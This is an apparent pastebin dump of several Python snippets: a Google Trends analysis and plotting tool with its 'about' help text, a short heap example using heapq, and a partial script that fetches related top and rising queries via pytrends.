    fig, ax = plt.subplots(figsize=(16, 8))
    colors = plt.cm.viridis(np.linspace(0, 1, len(keywords)))

    def update(frame):
        ax.clear()

        # Calculate the month
        month = frame + 1

        # Plot the scatter chart for the current month
        start_index = frame * len(interest_over_time) // max_months
        end_index = (frame + 1) * len(interest_over_time) // max_months
        xs = interest_over_time.index[:end_index]
        
        for k, keyword in enumerate(keywords):
            ys = interest_over_time[keyword][:end_index]

            # Use different colors for each keyword
            color = colors[k]

            # Plot the scatter plot for the current keyword
            scatter = ax.scatter(xs, ys, color=color, label=f'{keyword} - Avg: {ys.mean():.2f}')

            # Plot the average line for the current keyword
            avg_interest = ys.mean()
            ax.axhline(y=avg_interest, color=color, linestyle='--', linewidth=1)

        # Calculate the percentage of completion
        percent_complete = (month / max_months) * 100

        ax.set_title(f'Animated Scatter Plot - (Percent Complete - {percent_complete:.2f}%)')
        ax.set_xlabel('Month')
        ax.set_ylabel('Interest Level')
        ax.legend(loc='upper left')

        # Set y-axis ticks from 0 to 100 in increments of 10
        ax.set_yticks(np.arange(0, 110, 10))

        # Set the fixed height for the y-axis
        ax.set_ylim(0, 100)

    # Calculate total frames
    total_frames = min(len(interest_over_time), max_months)

    # Create the animation
    animation_scatter = animation.FuncAnimation(fig, update, frames=total_frames, interval=100, repeat=False)

    plt.show()


# GENERATE SCATTER PLOT
def generate_scatter_plot(interest_over_time, keywords):
    '''
        GENERATE AND DISPLAY A SCATTER PLOT.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
    '''
    print(""\nGenerating Scatter Plot..."")

    plt.figure(figsize=(16, 8))

    # Set a list of distinct colors and markers for each keyword
    colors = plt.cm.viridis(np.linspace(0, 1, len(keywords)))
    
    # Markers Used: 'X': X, '^': Up triangle, '<': Left triangle, '>': Right triangle, 'o': Circle.
    markers = ['X', '^', '<', '>', 'o']  # Set the 5 markers to display

        
    # Calculate strengths based on the maximum interest value for each keyword
    strengths = [interest_over_time[keyword].max() for keyword in keywords]

    for i, keyword in enumerate(keywords):
        # Use strengths (divided by 0.50) to set the size of the points
        # Use different markers for each keyword
        plt.scatter(interest_over_time.index, interest_over_time[keyword],
                    label=None, s=strengths[i]/0.50, color=colors[i], marker=markers[i])

    # Draw the average lines outside the loop
    avg_values = []
    for i, keyword in enumerate(keywords):
        avg_interest = interest_over_time[keyword].mean()
        avg_values.append(avg_interest)
        plt.axhline(y=avg_interest, color=colors[i], linestyle='--', linewidth=1, label=f'{keyword} - Avg: {avg_interest:.2f}')

    # Create custom legend with correct markers
    custom_legend = [Line2D([0], [0], marker=markers[i], color=colors[i], label=f'{keywords[i]}') for i in range(len(keywords))]
    plt.legend(handles=custom_legend, loc='upper left')

    plt.title('Static Scatter Plot')
    plt.xlabel('Date')
    plt.ylabel('Interest Level')

    # Set y-axis ticks from 0 to 100 in increments of 10
    plt.yticks(np.arange(0, 110, 10))

    # Set the fixed height for the y-axis
    plt.ylim(0, 100)

    plt.show()



'''                    [STACK PLOTS]'''

# ANIMATED STACK PLOT
def animate_stack_plot(interest_over_time, keywords):
    '''
        GENERATE AND DISPLAY AN ANIMATED STACK PLOT.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
    '''
    print(""\nAnimating Stack Plot..."")

    fig, ax = plt.subplots(figsize=(16, 8))
    colors = plt.cm.viridis(np.linspace(0, 1, len(keywords)))

    def update(frame):
        ax.clear()

        # Calculate the percentage of completion
        percent_complete = (frame + 1) / total_frames * 100

        # Extract interest values for each keyword
        y_values = [interest_over_time[keyword].iloc[:frame + 1] for keyword in keywords]

        # Create a stack plot for the current frame
        ax.stackplot(interest_over_time.index[:frame + 1], y_values, labels=keywords, colors=colors, alpha=0.7)

        ax.set_title(f'Animated Stack Plot - ({percent_complete:.2f}% Complete)')
        ax.set_xlabel('Date')
        ax.set_ylabel('Interest Level')
        ax.legend(loc='upper left')

        # Set y-axis ticks from 0 to 300 in increments of 20
        ax.set_yticks(np.arange(0, 320, 20))
        # Set the fixed height for the y-axis
        ax.set_ylim(0, 300)

    # Calculate total frames
    total_frames = len(interest_over_time)

    # Create the animation
    animation_stack_plot = animation.FuncAnimation(fig, update, frames=total_frames, interval=250, repeat=False)

    plt.show()

# GENERATE STACK PLOT
def generate_stack_plot(interest_over_time, keywords):
    '''
        GENERATE AND DISPLAY A STATIC STACK PLOT.

        PARAMETERS:
        - INTEREST_OVER_TIME (DATAFRAME): DATAFRAME CONTAINING INTEREST OVER TIME.
        - KEYWORDS (LIST[STR]): LIST OF KEYWORDS TO PLOT.
    '''
    print(""\nGenerating Stack Plot..."")

    fig, ax = plt.subplots(figsize=(16, 8))  # Create a new figure and axes

    # Extract interest values for each keyword
    y_values = [interest_over_time[keyword] for keyword in keywords]

    # Create a stack plot
    ax.stackplot(interest_over_time.index, y_values, labels=keywords, alpha=0.7)

    plt.title('Static Stack Plot')
    plt.xlabel('Date')
    plt.ylabel('Interest Level')
    plt.legend(loc='upper left')

    # Set y-axis ticks from 0 to 300 in increments of 20
    ax.set_yticks(np.arange(0, 320, 20))
    # Set the fixed height for the y-axis
    ax.set_ylim(0, 300)

    plt.show()



'''                    [WORDCLOUD] '''

'''
    GENERATE AND DISPLAY A WORD CLOUD WITH RELATED (TOP/RISING) DATA OR USER-INPUT TOPICS.

    PARAMETERS:
    - PYTRENDS (TrendReq): AN INSTANCE OF THE pytrends LIBRARY FOR FETCHING DATA.
    - KEYWORDS (LIST[STR]): LIST OF KEYWORDS FOR WHICH RELATED DATA IS FETCHED.
    - NUM_RELATED_TOP (INT): NUMBER OF TOP RELATED QUERIES TO FETCH FOR EACH KEYWORD.
    - NUM_RELATED_RISING (INT): NUMBER OF RISING RELATED QUERIES TO FETCH FOR EACH KEYWORD.
    - RELATED_DATA_DISPLAYED (BOOL): FLAG TO INDICATE WHETHER RELATED DATA SHOULD BE DISPLAYED (DEFAULT: FALSE).
'''

# GENERATE WORD CLOUD WITH RELATED (TOP/RISING)
def generate_word_cloud(pytrends, keywords, num_related_top, num_related_rising, related_data_displayed=False):
    try:
        related_queries_data = {'top': [], 'rising': []}

        def process_related_data(keyword):
            nonlocal related_queries_data
            try:
                related_queries_top = pytrends.related_queries()[keyword]['top'].head(num_related_top)
                if not related_queries_top.empty:
                    related_queries_data['top'].extend(related_queries_top['query'])
            except Exception as e:
                print(f""Failed to get related top queries for '{keyword}'. Error: {e}"")

            try:
                related_queries_rising = pytrends.related_queries()[keyword]['rising'].head(num_related_rising)
                if not related_queries_rising.empty:
                    related_queries_data['rising'].extend(related_queries_rising['query'])
            except Exception as e:
                print(f""Failed to get related rising queries for '{keyword}'. Error: {e}"")

        if not related_data_displayed:
            use_related_data = '1' 
            if use_related_data == '1':
                print(""\nGenerating Word Cloud with Related Data...\nThis may take some time to process..."")
                for keyword in keywords:
                    process_related_data(keyword)
                all_queries = ' '.join(related_queries_data['top'] + related_queries_data['rising'])
            elif use_related_data == '2':
                print(""\nGenerating Word Cloud with User Input Topics...\nThis may take some time to process..."")
                all_queries = ' '.join(keywords)
            else:
                print(""\nInvalid choice. Please enter 1 for Related Data or 2 for User Input Topics."")
                return
        else:
            all_queries = ' '.join(keywords)

        wordcloud = WordCloud(width=800, height=800, background_color='white').generate(all_queries)

        plt.figure(figsize=(8, 8))
        plt.imshow(wordcloud, interpolation='bilinear')
        plt.axis('off')
        plt.title('')  # Add a title if you need it here
        plt.show()

    except ValueError:
        print(""\nInvalid input. Please enter a valid number.\n"")
       

'''                    [MAIN LOGIC]'''

'''
    [MAIN LOGIC]:
    THIS SECTION CONTAINS THE CORE LOGIC FOR EXECUTING THE GOOGLE TRENDS DATA ANALYSIS AND VISUALIZATION TOOL.
    IT ENCOMPASSES THE MAIN PROGRAM FLOW, INCLUDING USER INPUT COLLECTION, DATA FETCHING FROM GOOGLE TRENDS,
    AND THE MAIN MENU-DRIVEN INTERFACE FOR GENERATING VARIOUS PLOTS AND ANALYSES. THE CODE STRUCTURE IS
    ORGANIZED INTO MODULAR FUNCTIONS, OFFERING CLARITY AND MAINTAINABILITY. THE MAIN LOOP ENSURES CONTINUOUS
    INTERACTION WITH THE USER UNTIL THE PROGRAM IS EXITED. ERROR HANDLING IS IMPLEMENTED TO MANAGE INVALID
    INPUTS, ENSURING A SMOOTH USER EXPERIENCE. ADDITIONALLY, A SYSTEM RESET FUNCTION IS DEFINED TO CLEAR DATA
    AND RESTART THE ANALYSIS. OVERALL, THIS SECTION FORMS THE BACKBONE OF THE SCRIPT, ORCHESTRATING THE
    INTERACTION BETWEEN THE USER, DATA, & VISUALIZATION COMPONENTS.
'''



'''                    [MAIN MENU]'''

try:
    while True:
        header()  # Call the global header
        # Get user selection
        print(""\n\t::[SELECT FROM THE MENU OPTIONS]::\n"")
        print(""::[SINGLE PLOTS]::\t\t::[DISPLAY]::\n"")
        print(""1: LINE PLOT\t\t\t6: WORDCLOUD + (TOP/RISING)"")
        print(""2: 3D BAR PLOT\t\t\t7: ALL PLOTS (2D & 3D)"")
        print(""3: PIE CHART (AVERAGE)"")
        print(""4: SCATTER PLOT (AVERAGE)"")
        print(""5: STACK PLOT"")
        print(""\n\t\t   ::[SYSTEM]::\n\n\t\t   9: RESET PROGRAM\n\t\t   0: Quit\n"")

        plot_option = input(""\nSelect Your Option or... Press [ENTER] For More Information : "")

        try:
            # Check if the user pressed [ENTER]
            if not plot_option:
                # Import and display the content of about.py
                import about
                about.display_about_text()

                input(""Press [ENTER] to continue to the main menu."")
                # Check if the user pressed [ENTER]
                if not plot_option.strip():
                    # Display a message and continue to the main menu
                    print(""\nContinuing To The Menu...\n"")
                    continue  # Go back to the main menu after displaying the ""About"" text
                # Check if the user input is not empty after removing leading and trailing whitespace
                if plot_option.strip():
                    try:  # Attempt to convert the user input to an integer
                        plot_option = int(plot_option)
                    except ValueError:
                        # If conversion to an integer fails (due to a non-numeric input), do nothing (pass)
                        pass
            # Attempt to convert the user input (plot_option) to an integer
            plot_option = int(plot_option)

            '''                    [PLOT OPTIONS]'''

            if 0 <= plot_option <= 9:
                if plot_option == 0:
                    print(""\nProgram Exiting...\tGoodBye!\n"")
                    break  # Exit the loop and end the script
                elif plot_option == 1:
                    try:
                        # Ask the user if they want static or animated plots
                        plot_type = input(""\nChoose the plot type: \n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                        if plot_type == '1':
                            generate_line_plot(interest_over_time, keywords, num_months)
                        elif plot_type == '2':
                            animate_line_plot(interest_over_time, keywords, num_months)
                        else:
                            print(""Invalid choice. Please enter 1 for static or 2 for animated."")

                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")
                elif plot_option == 2:
                    try:
                        # Ask the user if they want static or animated plots
                        plot_type = input(""\nChoose the plot type: \n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                        if plot_type == '1':
                            # Ask the user for 2D or 3D static plot
                            static_plot_type = input(""\nChoose the static plot type: \n1: 2D\n2: 3D\nYour Choice (1 or 2): "")

                            if static_plot_type == '1':
                                generate_2d_bar_plot(interest_over_time, keywords)
                            elif static_plot_type == '2':
                                generate_3d_bar_plot(interest_over_time, keywords)
                            else:
                                print(""Invalid choice. Please enter 1 for 2D or 2 for 3D."")
                        elif plot_type == '2':
                            # Ask the user for 2D or 3D animated plot
                            animated_plot_type = input(""\nChoose the animated plot type: \n1: 2D\n2: 3D\nYour Choice (1 or 2): "")

                            if animated_plot_type == '1':
                                animate_2d_bar_plot(interest_over_time, keywords)
                            elif animated_plot_type == '2':
                                animate_3d_bar_plot(interest_over_time, keywords)
                            else:
                                print(""Invalid choice. Please enter 1 for 2D or 2 for 3D."")
                        else:
                            print(""Invalid choice. Please enter 1 for static or 2 for animated."")
                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")
                elif plot_option == 3:
                    try:
                        # Ask the user if they want static or animated pie chart
                        plot_type = input(""\nChoose the pie chart type: \n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                        if plot_type == '1':
                            generate_pie_chart(interest_over_time, keywords, num_months)
                        elif plot_type == '2':
                            animate_pie_chart(interest_over_time, keywords, num_months)
                        else:
                            print(""Invalid choice. Please enter 1 for static or 2 for animated."")

                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")
                elif plot_option == 4:
                    try:
                        # Ask the user if they want static or animated plots
                        plot_type = input(""\nChoose the plot type: \n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                        if plot_type == '1':
                            generate_scatter_plot(interest_over_time, keywords)
                        elif plot_type == '2':
                            animate_scatter_plot(interest_over_time, keywords)
                        else:
                            print(""Invalid choice. Please enter 1 for static or 2 for animated."")

                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")                        
                elif plot_option == 5:
                    try:
                        # Ask the user if they want static or animated plots
                        plot_type = input(""\nChoose the plot type: \n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                        if plot_type == '1':
                            generate_stack_plot(interest_over_time, keywords)
                        elif plot_type == '2':
                            animate_stack_plot(interest_over_time, keywords)
                        else:
                            print(""Invalid choice. Please enter 1 for static or 2 for animated."")

                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")
                elif plot_option == 6:
                    try:
                        num_related_top = int(input(""\nEnter the number of related top queries to include in the word cloud (Max 24):\n""))
                        num_related_rising = int(input(""\nEnter the number of related rising queries to include in the word cloud (Max 24):\n""))

                        # Call the generate_word_cloud function and get the words
                        wordcloud_words = generate_word_cloud(pytrends, keywords, num_related_top, num_related_rising)
                        
                    except ValueError:
                        print(""\nInvalid input. Please enter a valid number.\n"")
                elif plot_option == 7:
                    # Ask the user if they want static or animated plots
                    plot_type = input(""\nChoose plot type:\n1: Static\n2: Animated\nYour Choice (1 or 2): "")

                    if plot_type == '1':
                        # Ask the user for 2D or 3D static plot
                        static_plot_type = input(""\nChoose the static plot type: \n1: 2D\n2: 3D\nYour Choice (1 or 2): "")

                        if static_plot_type == '1':
                            generate_line_plot(interest_over_time, keywords, num_months)
                            generate_scatter_plot(interest_over_time, keywords)
                            generate_stack_plot(interest_over_time, keywords)
                            generate_2d_bar_plot(interest_over_time, keywords)
                            generate_pie_chart(interest_over_time, keywords, num_months)

                        elif static_plot_type == '2':
                            generate_line_plot(interest_over_time, keywords, num_months)
                            generate_scatter_plot(interest_over_time, keywords)
                            generate_stack_plot(interest_over_time, keywords)
                            generate_3d_bar_plot(interest_over_time, keywords)
                            generate_pie_chart(interest_over_time, keywords, num_months)

                        else:
                            print(""Invalid choice for static plot type. Please enter 1 for 2D or 2 for 3D."")

                    elif plot_type == '2':
                        # Ask the user for 2D or 3D animated plot
                        animated_plot_type = input(""\nChoose the animated plot type: \n1: 2D\n2: 3D\nYour Choice (1 or 2): "")

                        if animated_plot_type == '1':
                            animate_line_plot(interest_over_time, keywords, num_months)
                            animate_scatter_plot(interest_over_time, keywords)
                            animate_stack_plot(interest_over_time, keywords)
                            animate_2d_bar_plot(interest_over_time, keywords)
                            animate_pie_chart(interest_over_time, keywords, num_months)

                        elif animated_plot_type == '2':
                            animate_line_plot(interest_over_time, keywords, num_months)
                            animate_scatter_plot(interest_over_time, keywords)
                            animate_stack_plot(interest_over_time, keywords)
                            animate_3d_bar_plot(interest_over_time, keywords)
                            animate_pie_chart(interest_over_time, keywords, num_months)

                        else:
                            print(""Invalid choice for animated plot type. Please enter 1 for 2D or 2 for 3D."")

                    if related_data_displayed:
                        wordcloud = generate_word_cloud(pytrends, keywords, num_related_top, num_related_rising, related_data_displayed)
                        if wordcloud:
                            # Display the word cloud using matplotlib
                            plt.figure(figsize=(8, 8))
                            plt.imshow(wordcloud, interpolation='bilinear')
                            plt.axis('off')
                            plt.title('Word Cloud of Related Queries')
                            plt.show()
                elif plot_option == 9:
                    # Reset the program and clear data
                    reset_program()

                    # Continue directly to the main menu
                    continue

            else:
                # Handling Invalid Options
                print(""\nInvalid option. Please enter a valid number between 0 and 7.\n"")
                # Exception Handling for Non-Integer Option
        except ValueError:
            print(""\nInvalid input. Please enter a valid number.\n"")

        else:
            # Exception Handling for Invalid Number of Months
            print(""\nInvalid number of months. Please enter a number between 1 and 240.\n"")
except ValueError:
    print(""\nInvalid input. Please enter a valid number.\n"")



"
14xC5Mji,about,Python253,Python,Saturday 6th of April 2024 12:04:05 AM CDT,"""""""
This python snippet is to be used with Trend AV (V. 127)

Note: Be sure to save this file as 'about.py' in the current working directory
""""""

def display_about_text():
    print(
            f""\n\n\nABOUT TREND AV - GOOGLE TRENDS DATA ANALYSIS AND VISUALIZER TOOL""
            f""\nOVERVIEW\nVERSION: 1.27\nAUTHOR: JEOI REQI\nDATE: FEBRUARY 2024""
            f""\n\nDESCRIPTION:""
            f""\nTREND AV IS A PYTHON SCRIPT THAT UTILIZES THE GOOGLE TRENDS API TO ANALYZE AND VISUALIZE""
            f""\nTHE INTEREST OVER TIME FOR USER-SPECIFIED TOPICS. IT GENERATES MONTHLY SEPARATED LINE""
            f""\nPLOTS WITH EMPTY BULLETS, 3D BAR PLOTS, PIE CHARTS & SCATTER PLOTS WITH AVERAGE VALUES,""
            f""\nGENERATES WORDCLOUDS, ANIMATES PLOTS, DISPLAYS RELATED TOPICS, AND SAVES THE OUTPUT TO A TEXT FILE.""
            f""\n\nKEY FEATURES:""
            f""\n1. [INTEREST OVER TIME ANALYSIS]""
            f""\n   VISUALIZE THE INTEREST OVER TIME FOR A SET OF TOPICS. MONTHLY LINE PLOTS WITH""
            f""\n   DISTINCTIVE HOLLOW BULLETS PROVIDE AN INTUITIVE REPRESENTATION OF THE TRENDS""
            f""\n   FOR EACH SPECIFIED KEYWORD.""
            f""\n2. [3D BAR PLOTS]""
            f""\n   GO BEYOND CONVENTIONAL PLOTTING METHODS WITH 3D BAR PLOTS. THIS VISUALLY""
            f""\n   STRIKING REPRESENTATION ALLOWS YOU TO EXPLORE THE NUANCES OF INTEREST LEVELS""
            f""\n   ACROSS DIFFERENT TOPICS AND TIME PERIODS.""
            f""\n3. [PIE CHARTS WITH AVERAGE VALUES]""
            f""\n   GENERATE PIE CHARTS WITH AVERAGE VALUES FOR A QUICK OVERVIEW OF THE COLLECTIVE""
            f""\n   STRENGTH OF SELECTED TOPICS. THIS FEATURE CONDENSES THE DATA INTO A""
            f""\n   COMPREHENSIVE VISUAL DISPLAY, MAKING IT EASIER TO IDENTIFY DOMINANT TRENDS.""
            f""\n4. [SCATTER PLOT]""
            f""\n   EXPLORE THE DISTRIBUTION OF INTEREST LEVELS OVER TIME WITH A SCATTER PLOT WITH AVERAGES.""
            f""\n   THIS OPTION GENERATES A VISUAL REPRESENTATION OF THE DATA POINTS FOR EACH SPECIFIED KEYWORD, ALLOWING""
            f""\n   YOU TO IDENTIFY PATTERNS AND TRENDS. THE SCATTER PLOT IS PARTICULARLY USEFUL WHEN""
            f""\n   EXAMINING RELATIONSHIPS BETWEEN MULTIPLE TOPICS.""
            f""\n5. [STACK PLOT]""
            f""\n   GENERATE AND DISPLAY A STACK PLOT. THIS PLOT PROVIDES A VISUAL REPRESENTATION OF THE CUMULATIVE""
            f""\n   INTEREST LEVELS OF MULTIPLE TOPICS OVER TIME. IT IS USEFUL FOR COMPARING THE OVERALL IMPACT""
            f""\n   OF DIFFERENT KEYWORDS ON THE TREND.""
            f""\n6. [WORDCLOUD]""
            f""\n   INCLUDED IN THE 'VIEW ALL PLOTS' OPTION, YOU CAN GENERATE A WORDCLOUD BASED""
            f""\n   ON RELATED QUERIES TO VISUALLY REPRESENT THE MOST RELEVANT TERMS.""
            f""\n7. [RELATED TOPICS EXPLORATION]""
            f""\n   EXPLORE RELATED TOPICS BY DISPLAYING BOTH TOP AND RISING QUERIES ASSOCIATED""
            f""\n   WITH YOUR SPECIFIED KEYWORDS. THE RELATED DATA IS PRESENTED IN A TABULAR""
            f""\n   FORMAT, OFFERING A DETAILED OVERVIEW.""
            f""\n8. [ANIMATE PLOT]""
            f""\n   ENABLE THIS OPTION TO ADD DYNAMIC ANIMATION TO THE PLOTS. WHEN SELECTED, THE PLOT WILL""
            f""\n   DISPLAY A TIME-BASED ANIMATION, PROVIDING A VISUAL REPRESENTATION OF HOW INTEREST""
            f""\n   LEVELS EVOLVE OVER THE SELECTED TIMEFRAME. THIS FEATURE ADDS A DYNAMIC ELEMENT TO""
            f""\n   THE VISUALIZATION, MAKING IT EASIER TO OBSERVE TRENDS AND CHANGES IN INTEREST OVER TIME.""
            f""\n9. [DATA EXPORT]""
            f""\n   SAVE THE DISPLAYED DATA, INCLUDING RELATED QUERIES AND TERMINAL OUTPUT, TO""
            f""\n   A DYNAMICALLY NAMED TEXT FILE FOR FUTURE REFERENCE AND ANALYSIS.""
            f""\n\nHOW TO USE""
            f""\n1. [SETUP]""
            f""\n   ENSURE YOU HAVE THE REQUIRED PYTHON LIBRARIES INSTALLED, INCLUDING""
            f""\n   MATPLOTLIB, PYTRENDS, WARNINGS, TABULATE, AND NUMPY. RUN THE SCRIPT IN A PYTHON""
            f""\n   ENVIRONMENT.""
            f""\n2. [INPUT TOPICS]""
            f""\n   ENTER THE NUMBER OF TOPICS YOU WANT TO ANALYZE (UP TO A MAXIMUM OF 5). PROVIDE""
            f""\n   THE SPECIFIC TOPICS OR QUERIES OF INTEREST.""
            f""\n3. [SELECT TIMEFRAME]""
            f""\n   SPECIFY THE NUMBER OF MONTHS FOR WHICH YOU WANT TO ANALYZE THE DATA (UP TO A""
            f""\n   MAXIMUM OF 12).""
            f""\n4. [EXPLORE MENU OPTIONS]""
            f""\n   CHOOSE FROM A RANGE OF MENU OPTIONS, INCLUDING LINE PLOTS, 3D BAR PLOTS, PIE""
            f""\n   CHARTS, AND RELATED DATA EXPLORATION. VIEW ALL PLOTS SIMULTANEOUSLY FOR A""
            f""\n   HOLISTIC UNDERSTANDING OF THE TRENDS.""
            f""\n5. [SAVE DATA]""
            f""\n   OPTIONALLY SAVE THE DISPLAYED DATA TO A TEXT FILE FOR FUTURE ANALYSIS.""
            f""\n6. [RESET PROGRAM]""
            f""\n   THIS OPTION RESETS THE PROGRAM, PROVIDING THE USER WITH A FRESH START.""
            f""\n   CHOOSING THIS OPTION ALLOWS YOU TO INPUT NEW TOPICS AND RESTART THE ANALYSIS.""
            f""\n\nNOTE:""
            f""\nENSURE A STABLE INTERNET CONNECTION FOR FETCHING DATA FROM THE GOOGLE TRENDS API.""
            f""\n\nTREND AV EMPOWERS USERS TO DERIVE VALUABLE INSIGHTS FROM GOOGLE TRENDS DATA""
            f""\nEFFORTLESSLY. WHETHER YOU'RE A DATA ENTHUSIAST, MARKETER, OR RESEARCHER, THIS SCRIPT""
            f""\nPROVIDES A ROBUST PLATFORM FOR EXPLORING AND UNDERSTANDING TRENDS ACROSS VARIOUS""
            f""\nTOPICS.\n\n\n""
            )
"
aHH244nk,Heap,nathanwailes,Python,Friday 5th of April 2024 11:57:19 PM CDT,"""""""
A heap is a specialized tree-based data structure that satisfies the heap property. In a heap, for any given node C, if P is a parent node of C, then the key (the value) of node P is either greater than or equal to (in a max heap) or less than or equal to (in a min heap) the key of node C. The node at the ""top"" of the heap (with no parents) is called the root node.

Types of Heaps
- Max Heap: In a max heap, for any given node C and parent node P, the key of P is greater than or equal to the key of C. Thus, the node with the greatest key is always the root node of the tree.
- Min Heap: In a min heap, for any given node C and parent node P, the key of P is less than or equal to the key of C. Thus, the node with the smallest key is always the root node of the tree.

In Python, the heapq module provides an implementation of the min heap. By default, heapq creates a min heap, where the smallest element is always popped first. Here's a quick overview of some of the functions provided by the heapq module:

- heapq.heappush(heap, item): Pushes a new item onto the heap, maintaining the heap invariant.
- heapq.heappop(heap): Pops and returns the smallest item from the heap, maintaining the heap invariant. If the heap is empty, IndexError is raised.
- heapq.heapify(x): Transforms the list x into a heap in linear time.
""""""

import heapq

def heap(nums, k):
    # Initialize a min heap
    min_heap = nums[:k]
    heapq.heapify(min_heap)
    
    # Iterate through the rest of nums
    for num in nums[k:]:
        if num > min_heap[0]:  # If current num is larger than the smallest in heap
            heapq.heappop(min_heap)  # Remove the smallest
            heapq.heappush(min_heap, num)  # Push the current num
            
    # The heap contains the k largest elements
    return min_heap

# Example usage
nums = [3, 2, 3, 1, 2, 4, 5, 5, 6]
k = 4
print(heap(nums, k))
# Output: [4, 5, 5, 6]
"
AW9VDBaE,toprising,Python253,Python,Friday 5th of April 2024 11:54:28 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: toprising.py
# Version: 0.0.2
# Author: Jeoi Reqi
# Date: February 2024

""""""
This script provides functionality to retrieve and display related topics, including top and rising queries, for specified keywords using the Google Trends API.

Functions:
    - display_related_data(pytrends, keywords, num_related_top, num_related_rising): Retrieves and displays related topics, including top and rising queries, for specified keywords.
    - get_ports_name(pid): Retrieves the process name associated with a given process ID (PID).
    - display_ports_in_use(ports_in_use): Displays the list of ports currently in use along with their associated processes and programs.

Features:
    - Uses the Google Trends API (via pytrends library) to retrieve related topics, top queries, and rising queries for specified keywords.
    - Supports input of up to 5 topics/keywords.
    - Allows users to specify the number of months to gather data and the number of top and rising related topics to display.
    - Provides the option to save the displayed data to a text file.

Requirements:
    - Python 3.x
    - pytrends library (install via pip: pip install pytrends)
    - tabulate library (install via pip: pip install tabulate)

Usage:
    1. Ensure Python 3.x is installed on your system.
    2. Install the pytrends library by running: pip install pytrends
    3. Install the tabulate library by running: pip install tabulate
    4. Save the script as 'toprising.py'.
    5. Execute the script using the command: python toprising.py
    6. Follow the prompts to input topics, number of months, and related topics to display.

Notes:
    - This script relies on the pytrends library to interact with the Google Trends API.
    - The script prompts the user to input topics, the number of months to gather data, and the number of related topics to display.
    - It uses the tabulate library to format and display the related data in a tabular format.
    - The displayed data includes both top and rising related queries for each specified keyword.
    - The script provides the option to save the displayed data to a text file for later reference.
""""""

from pytrends.request import TrendReq
from tabulate import tabulate
from typing import List
import sys

# [CONSTANTS]
# Set the constant max values for topics & results
max_topics = 5
max_top = 24
max_rising = 24
max_months = 240

# GET RELATED (TOP/RISING) DATA
def display_related_data(pytrends, keywords, num_related_top, num_related_rising):
    """"""
    Display related topics, including top and rising queries, for specified keywords.

    Parameters:
    - pytrends (TrendReq): Google Trends API object.
    - keywords (List[str]): List of keywords to retrieve related data for.
    - num_related_top (int): Number of top related queries to display.
    - num_related_rising (int): Number of rising related queries to display.

    Returns:
    - str: 'return' if user chooses to return to the main program, 'end' if user chooses to end the program.
    """"""
    # Display related topics
    print(""\n\t\t\t::GATHERING RELATED TOPICS::\n\t\t    This may take some time to process...\n"")

    terminal_output = """"  # Store the terminal output in a variable

    for keyword in keywords:
        try:
            # Create pytrends object inside the function
            pytrends_local = TrendReq(hl='en-US', tz=-480)
            pytrends_local.build_payload([keyword], timeframe=f'today {num_months}-m')  # Use user input for timeframe
            related_queries_top = pytrends_local.related_queries()[keyword]['top'].head(num_related_top)
            if not related_queries_top.empty:
                terminal_output += f""\nTop queries for '{keyword}':\n""
                # Store top related queries in tabular form
                terminal_output += tabulate(related_queries_top, headers='keys', tablefmt='pretty') + '\n'
            else:
                terminal_output += f""\nNo top related queries found for '{keyword}'.\n""
        except Exception as e:
            terminal_output += f""Failed to get top related queries. Error: {e}\n""

        try:
            related_queries_rising = pytrends_local.related_queries()[keyword]['rising'].head(num_related_rising)
            if not related_queries_rising.empty:
                terminal_output += f""\nRising queries for '{keyword}':\n""
                # Store rising related queries in tabular form
                terminal_output += tabulate(related_queries_rising, headers='keys', tablefmt='pretty') + '\n'
            else:
                terminal_output += f""\nNo rising related queries found for '{keyword}'.\n""
        except Exception as e:
            terminal_output += f""Failed to get rising related queries. Error: {e}\n""

    # Display the stored terminal output
    print(terminal_output)

    # Ask if the user wants to save the data
    save_option = input(""\nDo you want to save the displayed data?\n1: Yes\n2: No\nYour Choice (1 or 2): "")
    if save_option == '1':
        # Save output to a dynamic named file
        filename = '_'.join(keywords) + '_related_data.txt'
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(""\n::DISPLAYED RELATED DATA::\n\n"")
            f.write(f""Number of related top queries displayed: {num_related_top}\n"")
            f.write(f""Number of related rising queries displayed: {num_related_rising}\n"")
            f.write(""\n::TERMINAL OUTPUT::\n\n"")
            f.write(terminal_output)
        print(f""\nOutput saved to file: {filename}"")
        print(""Program Exiting, Goodbye!"")
        sys.exit(0)
    elif save_option == '2':
        print(""Program Exiting, Goodbye!"")
        sys.exit(0)
    else:
        print(""\nInvalid option. Data not saved."")

# Allow the user to input up to 5 topics
keywords: List[str] = []
while True:
    try:
        num_topics = int(input(f""\nEnter the number of topics (1 to {max_topics}): ""))
        if 1 <= num_topics <= max_topics:
            for i in range(num_topics):
                keyword = input(f""Enter topic/query {i+1}: "")
                keywords.append(keyword)
        else:
            print(f""\nInvalid number of topics. Please enter a number between 1 and {max_topics}.\n"")
    except ValueError:
        print(""\nInvalid input. Please enter a valid number.\n"")
    if 1 <= len(keywords) <= max_topics:
        break

# Allow the user to input the number of months to gather
try:
    num_months = int(input(f""\nEnter the number of months to gather data (1 to {max_months}): ""))
    if 0 < num_months <= max_months:
        # Allow the user to input the number of top and related topics (0 to 240)
        num_top_related_topics = int(input(f""\nEnter the number of Top Related topics to display (0 to {max_top}): ""))
        if 0 <= num_top_related_topics <= max_top:
            num_rising_related_topics = int(input(f""\nEnter the number of Rising Related topics to display (0 to {max_rising}): ""))
            if 0 <= num_rising_related_topics <= max_rising:
                if num_top_related_topics > 0 or num_rising_related_topics > 0:
                    # Fetch data for topics
                    try:
                        pytrends = TrendReq(hl='en-US', tz=-480)
